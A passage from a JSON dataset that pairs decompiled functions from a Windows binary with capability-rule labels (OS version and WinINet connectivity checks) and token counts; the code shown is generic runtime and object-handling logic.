        "decompiled_code": "\nvoid fcn.0041895c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x41896e;\n    iVar1 = fcn.004152b4();\n    uStack24 = 0x4189cc;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00414eec();\n            if ((*(iVar2 + 4) == *(in_EAX + 4)) && (*(iVar2 + 0xc) == *(in_EAX + 0xc))) {\n                fcn.00403f58();\n                fcn.00414dd8();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4189d3;\n    uStack24 = 0x4189cb;\n    fcn.00415318();\n    return;\n}\n",
        "token_count": 297
    },
    "004189d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004189d8(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x418b0e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar1 = in_EAX[0xc];\n    if (iVar1 != 0) {\n        uStack52 = 0x418af1;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        var_10h = *(iVar1 + 8);\n        puVar2 = &stack0xfffffffc;\n        var_8h = in_EAX;\n        if (-1 < var_10h + -1) {\n            do {\n                puStack36 = puVar2;\n                puVar4 = fcn.00414eec();\n                fcn.00404e38();\n                (**(*var_8h + 0x24))();\n                var_ch = fcn.00418200();\n                if ((var_ch == 0) && (*(var_8h + 0x7a) != 0)) {\n                    (*var_8h[0x1e])(&fcn.004189d8::var_ch);\n                }\n                fcn.00414eec();\n                fcn.0041895c();\n                if ((var_ch == 0) && (cVar3 = fcn.00418124(),  cVar3 != '\\0')) {\n                    fcn.00414eec();\n                    fcn.0041522c();\n                    fcn.00415038();\n                }\n                else {\n                    (***puVar4)();\n                }\n                var_10h = var_10h + -1;\n                puVar2 = puStack36;\n            } while (var_10h != 0);\n        }\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x418af8;\n        uStack52 = 0x418af0;\n        fcn.00418b40();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x418b15;\n    uStack40 = 0x418b0d;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 628
    },
    "00418f2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nvoid __cdecl fcn.00418f2c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    char in_DL;\n    int32_t iVar3;\n    uint var_3h;\n    \n    iVar2 = fcn.00405c9c();\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        do {\n            if (in_DL == '\\0') {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = ~in_AX & *(iVar1 + 0x1c);\n            }\n            else {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = *(iVar1 + 0x1c) | in_AX;\n            }\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "00418f94": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00418f94(int32_t arg_8h)\n\n{\n    if (((*(arg_8h + -9) & 1) == 0) && (*(arg_8h + -0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 70
    },
    "00419014": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419014(int32_t arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4190fa;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x419039;\n    iVar2 = fcn.0041ac0c();\n    *(arg_8h + -0x14) = 0;\n    if (*(*(arg_8h + -8) + 0x72) != 0) {\n        puStack32 = arg_8h + -0x14;\n        uStack36 = 0x41906b;\n        (**(*(arg_8h + -8) + 0x70))();\n    }\n    if (*(arg_8h + -0x14) == 0) {\n        puStack32 = 0x419079;\n        uVar3 = (**(iVar2 + -0xc))();\n        *(arg_8h + -0x14) = uVar3;\n        if ((*(arg_8h + -9) & 4) != 0) {\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 1;\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 0x200;\n        }\n        uStack36 = 0x4190ce;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        (**(**(arg_8h + -0x14) + 0x2c))();\n        *in_FS_OFFSET = uStack40;\n    }\n    puVar1 = *(arg_8h + -0x14) + 0x1c;\n    *puVar1 = *puVar1 | 1;\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 534
    },
    "00419268": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419268(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x41948c;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41929e;\n    (**(*in_EAX + 0x28))();\n    puStack72 = 0x4192a9;\n    fcn.0041a588();\n    puStack72 = 0x4192b4;\n    fcn.0041a588();\n    iVar1 = in_EAX[0xb];\n    iVar2 = in_EAX[7];\n    uStack76 = 0x41945c;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    if (param_2 == NULL) {\n        if ((var_9h & 1) == 0) {\n            uStack88 = 0x4192f5;\n            puStack72 = &stack0xfffffffc;\n            fcn.00419014(&stack0xfffffffc);\n        }\n        else {\n            uStack88 = 0x4192ec;\n            puStack72 = &stack0xfffffffc;\n            fcn.004191c4(&stack0xfffffffc);\n        }\n    }\n    if (param_2 != NULL) {\n        uStack88 = 0x41941a;\n        uStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        fcn.00418eb4(&stack0xfffffffc);\n        *(param_2 + 7) = *(param_2 + 7) | 1;\n        fcn.00418f2c(&stack0xfffffffc);\n        if ((var_9h & 1) == 0) {\n            fcn.00419124(&stack0xfffffffc);\n        }\n        if (param_2 == NULL) {\n            *in_FS_OFFSET = uStack92;\n            fcn.00404878();\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x419493;\n            uStack76 = 0x41947d;\n            fcn.00404dc4();\n            uStack76 = 0x41948b;\n            fcn.00405e64();\n            return;\n        }\n        if ((*(param_2 + 0x1d) & 2) != 0) {\n            in_EAX[7] = param_2;\n        }\n        *(param_2 + 7) = *(param_2 + 7) | 2;\n        fcn.00418f2c(&stack0xfffffffc);\n        (**(*param_2 + 0x14))();\n        *(param_2 + 7) = *(param_2 + 7) & 0xfffd;\n        fcn.00418f2c(&stack0xfffffffc);\n        if ((var_9h & 2) != 0) {\n            fcn.00404154();\n        }\n        if (((var_9h & 1) == 0) && ((*(param_2 + 0x1d) & 2) == 0)) {\n            fcn.00418e78(&stack0xfffffffc);\n            fcn.00414d8c();\n        }\n        else {\n            iVar3 = fcn.00414f48();\n            if (iVar3 < 0) {\n                fcn.00418e78(&stack0xfffffffc);\n                fcn.00414d8c();\n            }\n        }\n        *in_FS_OFFSET = uStack92;\n    }\n    *in_FS_OFFSET = uStack80;\n    in_EAX[0xb] = iVar1;\n    in_EAX[7] = iVar2;\n    return;\n}\n",
        "token_count": 1014
    },
    "004194a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004194a8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) == 0) {\n        puStack16 = 0x4194c7;\n        uVar1 = fcn.00403f28();\n        *(in_EAX + 0x30) = uVar1;\n        uStack20 = 0x419503;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        fcn.00419518();\n        fcn.004189d8();\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x419514;\n        uStack20 = 0x419502;\n        fcn.00418b40();\n        return;\n    }\n    puStack16 = 0x419514;\n    fcn.00419518();\n    return;\n}\n",
        "token_count": 250
    },
    "00419938": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00419938(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    int32_t var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    puStack304 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack308 = 0x419a29;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack312;\n    fcn.00404da0();\n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        fcn.00404e38();\n    }\n    if (var_4h == 0) {\n        fcn.00403e38();\n        fcn.00405004();\n    }\n    var_124h = var_4h;\n    var_120h._0_1_ = 0xb;\n    var_11ch = **0x4929f8;\n    var_118h._0_1_ = 0xb;\n    var_114h = *(arg_8h + -8);\n    var_110h._0_1_ = 0xb;\n    var_10ch = *(in_EAX + 4);\n    var_108h._0_1_ = 0xb;\n    uVar2 = 3;\n    fcn.0040c6a4(3, &var_124h);\n    fcn.004047cc();\n    *in_FS_OFFSET = uVar2;\n    uStack312 = 0x419a30;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 462
    },
    "00419dfc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.00419dfc(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    unkbyte10 Var4;\n    ulong uVar5;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 5;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x41a108;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00419dfc::var_1ch;\n    puVar1 = &stack0xfffffffc;\n    if (*0x8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**_pe_dos_header == '\\a') {\n            fcn.00411aec();\n            cVar2 = fcn.004040e4();\n            puVar1 = var_14h;\n            if ((cVar2 != '\\0') && (iVar3 = fcn.00411aec(),  puVar1 = var_14h,  (*(iVar3 + 0x24) & 4) != 0))\n            goto code_r0x00419e71;\n        }\n        var_14h = puVar1;\n        fcn.00418648();\n        puVar1 = var_14h;\n    }\ncode_r0x00419e71:\n    var_14h = puVar1;\n    // switch table (17 cases) at 0x419e8b\n    switch(**_pe_dos_header) {\n    case '\\x01':\n        cVar2 = fcn.00418c2c();\n        if (cVar2 == '\\a') {\n            fcn.0041973c();\n            fcn.00419c58();\n        }\n        else {\n            fcn.00419838();\n            fcn.00411b60();\n        }\n        break;\n    case '\\x02':\n        fcn.00418cec();\n        fcn.00411b60();\n        break;\n    case '\\x03':\n        fcn.0041973c();\n        fcn.004119c4();\n        fcn.00411b60();\n        break;\n    case '\\x04':\n        Var4 = fcn.004195e8();\n        var_28h = Var4;\n        var_24h = Var4 >> 0x20;\n        fcn.00411e98(var_28h, var_24h, CONCAT22(0x41, Var4 >> 0x40));\n        break;\n    case '\\x05':\n    case '\\n':\n        fcn.0041a5c4();\n        fcn.00411d90();\n        break;\n    case '\\x06':\n        fcn.0041a4a8();\n        fcn.00411b60();\n        break;\n    case '\\a':\n        cVar2 = fcn.00418c2c();\n        if (cVar2 == '\\r') {\n            fcn.0041a764();\n            fcn.00411b60();\n        }\n        else if (cVar2 == '\\x0e') {\n            fcn.0041a764();\n            fcn.00411aec();\n            fcn.00418da8();\n        }\n        else {\n            fcn.0041973c();\n            var_24h = 0x41a04f;\n            fcn.00419ca0(&stack0xfffffffc);\n        }\n        break;\n    case '\\b':\n        cVar2 = fcn.00418c2c();\n        if (cVar2 == '\\r') {\n            fcn.0041a764();\n            fcn.004120e4();\n        }\n        else {\n            fcn.0041973c(0xe8);\n            var_24h = 0x41a09b;\n            (**(*in_EAX + 0x18))();\n            if (var_14h != NULL) {\n                fcn.004120e4();\n            }\n        }\n        break;\n    case '\\t':\n        fcn.00418d4c();\n        fcn.00411b60();\n        break;\n    case '\\v':\n        fcn.0041a680();\n        fcn.00411dc0();\n        break;\n    case '\\f':\n        var_24h = 0x41a0b7;\n        fcn.00419ce0(&stack0xfffffffc);\n        break;\n    case '\\x0f':\n        var_24h = 0x41a0d7;\n        fcn.00419d3c(&stack0xfffffffc);\n        break;\n    case '\\x10':\n        uVar5 = fcn.004198a4();\n        var_24h = uVar5;\n        fcn.0041211c(var_24h, uVar5 >> 0x20);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x41a10f;\n    fcn.00404dc4();\n    fcn.00405580();\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 1253
    },
    "0041a174": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a174(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint uStackY128;\n    uint uStackY124;\n    uchar *puStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    uchar *puStackY108;\n    uint arg_8h;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack92 = &stack0xfffffffc;\n    uStack72 = 0x41a495;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x41a1ad;\n    fcn.0041a564();\n    puStack80 = 0x41a1bc;\n    (**(**0x4962c4 + 0x14))();\n    uStack84 = 0x41a473;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 0x41a434;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack80 = &stack0xfffffffc;\n    (**(*in_EAX + 0x28))();\n    if (param_2 == NULL) {\n        fcn.0041a588();\n        iVar1 = fcn.00414644();\n        var_ch = (**(iVar1 + 0x2c))();\n        fcn.0041a588();\n        (**(*var_ch + 0x18))();\n    }\n    else {\n        fcn.0041a588();\n        var_ch = param_2;\n        if ((*(param_2 + 7) & 0x10) == 0) {\n            *(param_2 + 7) = *(param_2 + 7) | 1;\n            *(param_2 + 7) = *(param_2 + 7) | 2;\n            fcn.0041a588();\n            fcn.0041a114();\n            (**(*param_2 + 0x18))();\n        }\n        else {\n            fcn.0041a588();\n        }\n    }\n    in_EAX[6] = var_ch;\n    arg_8h = 1;\n    puStackY108 = 0x41a28c;\n    fcn.00403e30();\n    puStackY108 = 0x41a29a;\n    iVar1 = fcn.00414394(arg_8h);\n    in_EAX[0x21] = iVar1;\n    uStackY112 = 0x41a3d9;\n    uStackY116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    in_EAX[7] = var_ch;\n    puStackY120 = 0x41a2bf;\n    puStackY108 = &stack0xfffffffc;\n    iVar1 = fcn.00406b88();\n    iVar1 = *(iVar1 + 8);\n    if (iVar1 == 0) {\n        puStackY120 = 0x41a2e5;\n        iVar2 = fcn.00403f28();\n        in_EAX[0xd] = iVar2;\n    }\n    else {\n        in_EAX[0xd] = iVar1;\n    }\n    uStackY124 = 0x41a3b6;\n    uStackY128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    puStackY120 = &stack0xfffffffc;\n    iVar2 = fcn.00414f48();\n    if (iVar2 < 0) {\n        fcn.00414d8c();\n    }\n    in_EAX[10] = in_EAX[6];\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 1;\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 2;\n    (**(*in_EAX[6] + 0x14))();\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) & 0xfffd;\n    if ((iVar1 == 0) && (iVar2 = *(in_EAX[0xd] + 8),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00414eec();\n            (**(*piVar3 + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStackY128;\n    puStackY120 = 0x41a3bd;\n    if (iVar1 == 0) {\n        uStackY124 = 0x41a3ad;\n        fcn.00403f58();\n    }\n    in_EAX[0xd] = 0;\n    return;\n}\n",
        "token_count": 1289
    },
    "0041a4a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041a507)\n// WARNING: Removing unreachable block (ram,0x0041a516)\n\nvoid fcn.0041a4a8(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x41a552;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x41a525;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    cVar1 = fcn.0041a764();\n    if (cVar1 != '\\v') {\n        fcn.00418660();\n    }\n    fcn.0041196c();\n    fcn.0041a588();\n    *in_FS_OFFSET = uStack48;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41a559;\n    uStack32 = 0x41a551;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 312
    },
    "0041a778": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041a778(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack20 = 0x41a7b4;\n    fcn.0041a588();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41a7bb;\n    uStack20 = 0x41a7b3;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 153
    },
    "0041ab14": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041ab14(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.00404e38();\n    var_8h = 0;\n    if (*(in_EAX + 0x1c) != 0) {\n        var_8h = fcn.0041ba2c();\n    }\n    if (var_8h == 0) {\n        if (*(in_EAX + 0x5a) != 0) {\n            (**(in_EAX + 0x58))(&var_8h, param_1);\n        }\n        if (var_8h == 0) {\n            var_10h = var_4h;\n            var_ch._0_1_ = 0xb;\n            uVar1 = 0;\n            fcn.0040c6a4(0, &var_10h);\n            fcn.004047cc();\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 314
    },
    "0041ac0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.0041ac0c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack12;\n    \n    iStack12 = fcn.00418b7c();\n    if (((iStack12 == 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x1c) != *(in_EAX + 0x18))) {\n        iStack12 = fcn.00418b7c();\n    }\n    if (*(in_EAX + 0x6a) != 0) {\n        (**(in_EAX + 0x68))(&iStack12);\n    }\n    if (iStack12 != 0) {\n        cVar1 = fcn.00404184();\n        if (cVar1 != '\\0') goto code_r0x0041ac76;\n    }\n    fcn.00414584();\ncode_r0x0041ac76:\n    return CONCAT44(iStack12, iStack12);\n}\n",
        "token_count": 228
    },
    "0041b2c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041b2c0(void)\n\n{\n    sub.kernel32.dll_InitializeCriticalSection(0x4962e4);\n    *0x4962cc = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0, 0x41b2f0);\n    if (*0x4962cc == 0) {\n        fcn.0040db88();\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "0041b334": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041b334(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY108;\n    uint uStackY104;\n    uchar *puStackY100;\n    uint uStackY96;\n    uint uStackY92;\n    uchar *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uint uStackY60;\n    uint uStackY56;\n    uchar *puStackY52;\n    uint uStackY48;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    puStackY100 = &fcn.0041b334::var_1h + 1;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != **0x492d04) {\n        var_14h = sub.kernel32.dll_GetCurrentThreadId_1();\n        var_10h._0_1_ = 0;\n        uStackY48 = 0x41b372;\n        fcn.0040c6a4(0, &fcn.0041b334::var_14h);\n        uStackY48 = 0x41b377;\n        fcn.004047cc();\n    }\n    if (in_EAX < 1) {\n        uStackY48 = 0x41b389;\n        fcn.0041b30c();\n    }\n    else {\n        uStackY48 = 0x41b382;\n        fcn.0041b318();\n    }\n    var_ch = 0;\n    uStackY48 = 0x4962e4;\n    puStackY52 = 0x41b398;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStackY56 = 0x41b4f9;\n    uStackY60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStackY64 = var_ch;\n    uStackY68 = 0x490af4;\n    puStackY72 = 0x41b3b4;\n    puStackY52 = &fcn.0041b334::var_1h + 1;\n    var_ch = sub.kernel32.dll_InterlockedExchange();\n    uStackY76 = 0x41b4da;\n    uStackY80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if ((var_ch == 0) || (*(var_ch + 8) < 1)) {\n        var_1h._0_1_ = '\\0';\n    }\n    else {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((var_1h != '\\0') && (0 < *(var_ch + 8))) {\n        uStackY84 = 0x41b3f6;\n        puStackY72 = &fcn.0041b334::var_1h + 1;\n        var_8h = fcn.00414eec();\n        uStackY84 = 0x41b403;\n        fcn.00414dd8();\n        uStackY84 = 0x4962e4;\n        puStackY88 = 0x41b40d;\n        sub.kernel32.dll_LeaveCriticalSection();\n        uStackY92 = 0x41b47d;\n        uStackY96 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa0;\n        uStackY104 = 0x41b43e;\n        uStackY108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStackY88 = &fcn.0041b334::var_1h + 1;\n        